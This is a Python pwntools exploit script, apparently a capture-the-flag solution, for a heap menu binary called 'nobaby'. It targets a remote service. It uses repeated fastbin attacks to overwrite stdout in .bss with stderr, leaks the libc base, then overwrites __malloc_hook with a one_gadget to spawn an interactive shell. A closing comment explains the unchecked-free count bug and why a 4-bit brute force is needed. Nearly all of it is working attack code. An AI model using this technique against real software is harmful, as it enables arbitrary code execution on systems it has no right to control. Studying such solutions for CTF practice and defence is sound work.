# This exploit program bruceforce 4bit,
# so you need to run at least 16 times to see the result
# And this send a lot of payload so you need to wait at least 20s each time

from pwn import *

local = False

if local:
	r = process("./nobaby")
	gadget = 0xf02a4
	stdout_off = 0x3c5620
	stderr_off = 0x3c5540
	malloc_hook_off = 0x3c4b10
else:
	# nc 103.237.99.35 28994
	r = remote("103.237.99.35", 28994)
	gadget = 0xe9415
	stdout_off = 0x3c3400
	stderr_off = 0x3c31c0
	malloc_hook_off = 0x3c2740

def add(content):
	r.sendline("1")
	r.recvuntil("Content:")
	r.send(content)
	r.recvuntil("Your choice:")

def show(index):
	r.sendline("2")
	r.recvuntil("Index:")
	r.sendline(str(index))
	result = r.recvuntil("Your choice:")
	return result
def delete(index):
	r.sendline("3")
	r.recvuntil("Index:")
	r.sendline(str(index))
	r.recvuntil("Your choice:")

# use "0x7f" byte of exit_got to make malloc(0x60) return here
exit_got = 0x601ff8

# for debug
#ptr = 0x602060
#count = 0x6020b0

r.recvuntil("Name:")
r.send("\n")
r.recvuntil("Your choice:")

# make ptr[10] have value of heap
for i in range(10):
	add("1")
for i in range(10):
	delete(-1)
add("1")

# decrease count (ptr[10]) to trigger fast_bin attack
for i in range(0x71-4):
	delete(-1)

delete(0)
delete(1)
delete(9)
delete(8)
delete(10)

# overwrite .bss_stdout by stderr ??? <---- :haha
# leak libc_base by stdout (actually stderr) 
payload = p64(exit_got + 5 - 8)
add(payload)
add("anything")
add("anything")
payload = "b"*3*8 + "aaa\xc0\x11"
add(payload)

result = show(9)
result = result.split("aaa")[1][:6] + "\x00\x00"
libc_base = u64(result) - stderr_off 

print "Libc_base: " + hex(libc_base)
malloc_hook = libc_base + malloc_hook_off

for i in range(3):
	delete(-1)

# overwrite count global variable by heap_value again
add("abcd")

for i in range(0xe1-5):
	delete(-1)

delete(0)
delete(1)
delete(2)
delete(8)
delete(7)
delete(10)

# trigger fast_bin attack again
# overwrite malloc_hook by one_gadget
payload = p64(malloc_hook - 0x20 + 5 - 8)
add(payload)
add("anything")
add("anything")
payload = "\x00"*0x13 + p64(libc_base + gadget)
add(payload)

#add("Trigger one_gadget")
r.sendline("1")

r.interactive()


'''
- Vulnerability: decrease count global variable without confirm free() success or NOT
- Use fast_bin attack to leak libc_base and overwrite malloc_hook
- F**king libc file: stdout_off = 0x..00 -> can't leak libc_base
+ because if we change that byte ("\x00"), all output function will error
+ we have to use stderr to overwrite stdout in .bss section instead
+ to do that we have to bruceforce 4bit
- Remember when malloc() use a chunk in fast_bin, chunk.size = 0x7f (for example)
'''